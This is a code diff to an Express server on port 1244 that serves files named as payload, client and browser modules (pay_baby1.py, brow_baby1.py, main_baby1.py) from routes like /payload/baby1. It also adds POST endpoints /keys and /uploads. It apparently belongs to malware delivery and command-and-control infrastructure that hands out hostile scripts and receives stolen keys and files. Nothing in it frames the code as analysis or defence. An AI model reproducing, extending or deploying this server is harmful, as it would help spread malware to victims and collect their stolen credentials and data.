@@ -9,9 +9,9 @@ const app = express();
 const PORT = process.env.PORT || 1244;
 
 // Create a route to download the file
-app.get("/j/baby", (req, res) => {
+app.get("/j/baby1", (req, res) => {
   // Define the file path relative to the current directory
-  const filePath = path.join(__dirname, "modules", "gjs_baby.js");
+  const filePath = path.join(__dirname, "modules", "gjs_baby1.js");
 
   // Send the file for download
   res.download(filePath, "gjs_baby.js", (err) => {
@@ -48,12 +48,12 @@ app.get("/pdown", (req, res) => {
   });
 });
 
-app.get("/client/baby", (req, res) => {
+app.get("/client/baby1", (req, res) => {
   // Define the file path relative to the current directory
-  const filePath = path.join(__dirname, "modules", "main_baby.py");
+  const filePath = path.join(__dirname, "modules", "main_baby1.py");
 
   // Send the file for download
-  res.download(filePath, "main_baby.py", (err) => {
+  res.download(filePath, "main_baby1.py", (err) => {
     if (err) {
       console.error("Error downloading the file:", err);
       res.status(500).send("Error downloading the file");
@@ -61,12 +61,12 @@ app.get("/client/baby", (req, res) => {
   });
 });
 
-app.get("/payload/baby", (req, res) => {
+app.get("/payload/baby1", (req, res) => {
   // Define the file path relative to the current directory
-  const filePath = path.join(__dirname, "modules", "pay_baby.py");
+  const filePath = path.join(__dirname, "modules", "pay_baby1.py");
 
   // Send the file for download
-  res.download(filePath, "pay_baby.py", (err) => {
+  res.download(filePath, "pay_baby1.py", (err) => {
     if (err) {
       console.error("Error downloading the file:", err);
       res.status(500).send("Error downloading the file");
@@ -74,12 +74,12 @@ app.get("/payload/baby", (req, res) => {
   });
 });
 
-app.get("/brow/baby", (req, res) => {
+app.get("/brow/baby1", (req, res) => {
   // Define the file path relative to the current directory
-  const filePath = path.join(__dirname, "modules", "brow_baby.py");
+  const filePath = path.join(__dirname, "modules", "brow_baby1.py");
 
   // Send the file for download
-  res.download(filePath, "brow_baby.py", (err) => {
+  res.download(filePath, "brow_baby1.py", (err) => {
     if (err) {
       console.error("Error downloading the file:", err);
       res.status(500).send("Error downloading the file");
@@ -87,12 +87,12 @@ app.get("/brow/baby", (req, res) => {
   });
 });
 
-app.get("/adc/baby", (req, res) => {
+app.get("/adc/baby1", (req, res) => {
   // Define the file path relative to the current directory
-  const filePath = path.join(__dirname, "modules", "any_baby.py");
+  const filePath = path.join(__dirname, "modules", "any_baby1.py");
 
   // Send the file for download
-  res.download(filePath, "any_baby.py", (err) => {
+  res.download(filePath, "any_baby1.py", (err) => {
     if (err) {
       console.error("Error downloading the file:", err);
       res.status(500).send("Error downloading the file");
@@ -111,6 +111,18 @@ app.get("/any", (req, res) => {
       res.status(500).send("Error downloading the file");
     }
   });
+});
+
+app.post("/keys", (req, res) => {
+  console.log(
+    "Keys upload running------------------------------------------------->"
+  );
+});
+
+app.post("/uploads", (req, res) => {
+  console.log(
+    "Uploads running------------------------------------------------->"
+  );
 });
 
 // Start the server
